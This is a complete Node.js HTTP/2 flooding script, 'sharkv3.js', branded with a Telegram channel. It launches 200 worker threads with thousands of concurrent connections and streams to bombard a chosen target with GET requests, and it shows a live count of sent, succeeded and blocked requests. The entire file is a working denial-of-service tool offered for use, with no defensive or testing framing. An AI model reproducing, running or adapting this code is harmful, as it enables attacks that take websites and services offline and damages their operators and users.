const http2 = require('http2');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { cpus } = require('os');
const readline = require('readline');
const net = require('net');

const THREADS = 200;
const CONNECTIONS_PER_THREAD = 100;
const STREAMS_PER_CONNECTION = 100;
const MAX_INFLIGHT = 3000;
const WARMUP_TIME = 5000;

let total = 0, success = 0, blocked = 0, rps = 0, maxRps = 0;

if (isMainThread) {
    const [,, target, durationStr] = process.argv;
    if (!target || !durationStr) {
        console.log('Usage: node sharkv3.js <target> <duration_secs>');
        process.exit(1);
    }

    const duration = parseInt(durationStr);

    console.clear();
    console.log('Warming up...');

    setTimeout(() => {
        console.clear();
        console.log('SHARKV3 - T.ME/STSVKINGDOM');
        console.log('===========================');

        for (let i = 0; i < THREADS; i++) {
            new Worker(__filename, { workerData: { target, duration } });
        }

        const server = net.createServer(sock => {
            sock.on('data', buf => {
                const msg = buf.toString();
                if (msg === 'req') total++, rps++;
                else if (msg === 'ok') success++;
                else if (msg === 'err') blocked++;
            });
        });
        server.listen(9999);

        setInterval(() => {
            maxRps = Math.max(maxRps, rps);
            render();
            rps = 0;
        }, 1000);
    }, WARMUP_TIME);

    function render() {
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);
        console.log('SHARKV3 - T.ME/STSVKINGDOM');
        console.log('===========================');
        console.log(`total: ${total}`);
        console.log(`max-r: ${maxRps}`);
        console.log('===========================');
        console.log(`succes: ${success}`);
        console.log(`Blocked: ${blocked}`);
    }

} else {
    const { target, duration } = workerData;
    const end = Date.now() + duration * 1000;
    const sock = net.connect(9999, '127.0.0.1');
    const sendStat = msg => sock.write(msg);

    function flood(client) {
        const inflight = { count: 0 };

        function shoot() {
            if (Date.now() > end) return;
            if (inflight.count > MAX_INFLIGHT) return setTimeout(shoot, 1);

            try {
                inflight.count++;
                const req = client.request({ ':path': '/', ':method': 'GET' });
                req.setNoDelay?.(true);
                req.on('response', () => {
                    inflight.count--;
                    sendStat('ok');
                });
                req.on('error', () => {
                    inflight.count--;
                    sendStat('err');
                });
                req.end();
                sendStat('req');
            } catch {
                inflight.count--;
                sendStat('err');
            }

            setImmediate(shoot);
        }

        for (let i = 0; i < STREAMS_PER_CONNECTION; i++) shoot();
    }

    function connectLoop() {
        try {
            const client = http2.connect(target);
            client.on('error', () => {});
            client.on('close', () => setTimeout(connectLoop, 100));
            client.on('connect', () => flood(client));
        } catch {
            setTimeout(connectLoop, 250);
        }
    }

    for (let i = 0; i < CONNECTIONS_PER_THREAD; i++) connectLoop();
}
